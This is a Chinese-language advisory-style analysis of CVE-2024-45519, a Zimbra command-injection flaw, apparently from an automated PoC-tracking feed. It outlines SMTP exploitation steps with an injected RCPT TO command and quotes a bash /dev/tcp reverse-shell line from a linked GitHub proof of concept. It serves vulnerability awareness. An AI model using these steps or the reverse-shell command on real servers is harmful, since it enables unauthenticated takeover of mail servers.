## CVE-2024-45519-Zimbra-远程代码执行

**漏洞编号:** CVE-2024-45519

**漏洞类型:** 远程代码执行

**影响应用:** Zimbra Collaboration Suite (ZCS)

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** ZCS before 8.8.15 Patch 46, 9 before 9.0.0 Patch 41, 10 before 10.0.9, and 10.1 before 10.1.1

**利用条件:** 目标Zimbra服务器的25端口（SMTP）开放，且存在漏洞版本的Zimbra。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-45519 存在于Zimbra Collaboration Suite (ZCS) 的 postjournal 服务中，允许未经身份验证的攻击者执行任意命令。该漏洞是由于对输入的不当处理导致 OS 命令注入。利用方式如下：

1.  **漏洞原理：** 漏洞存在于 Zimbra 的 SMTP 服务中，通过构造恶意的 `RCPT TO` 命令，可以在服务器上执行任意命令。
2.  **利用步骤：**
    *   首先，连接到目标 Zimbra 服务器的 25 端口（SMTP）。
    *   发送 `EHLO` 命令进行握手。
    *   使用 `MAIL FROM` 命令指定发件人地址。
    *   通过构造包含命令注入的 `RCPT TO` 命令来利用漏洞。命令注入发生在双引号内，利用 `${IFS}` 绕过空格过滤。
    *   发送 `DATA` 命令，然后发送一些数据，最后以 `.
` 结束。
    *   最后，发送 `QUIT` 命令断开连接。
3.  **POC 代码分析：**  提供的 Python 脚本首先检查目标主机的 SMTP 端口是否开放。然后，它发送一个包含 OAST（Out-of-Band Application Security Testing）地址的 payload，以验证漏洞是否存在。如果漏洞存在，服务器会尝试访问 OAST 地址，从而确认漏洞。接下来，脚本尝试利用该漏洞建立反向 shell 连接到攻击者的机器上。脚本通过构造包含反向 shell 命令的 `RCPT TO` 命令来实现这一点。`reverse_shell = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'` 这段代码定义了反向 shell 的命令，并将目标机器的标准输入、输出和错误重定向到攻击者的 IP 地址和端口。
4.  **有效性：**根据漏洞库信息、搜索结果和提供的 PoC 代码，可以判断该漏洞利用代码是有效的。搜索结果表明该漏洞已被积极利用。
5.  **投毒风险：**分析 PoC 代码内容，未发现作者隐藏的投毒代码。代码目的是验证漏洞，如果验证通过，会利用此漏洞反弹shell。
综上所述，该漏洞的威胁较高，因为它可以被未经身份验证的攻击者利用，并可能导致完全控制受影响的 Zimbra 服务器。

**项目地址:** [p33d/CVE-2024-45519](https://github.com/p33d/CVE-2024-45519)

**漏洞详情:** [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)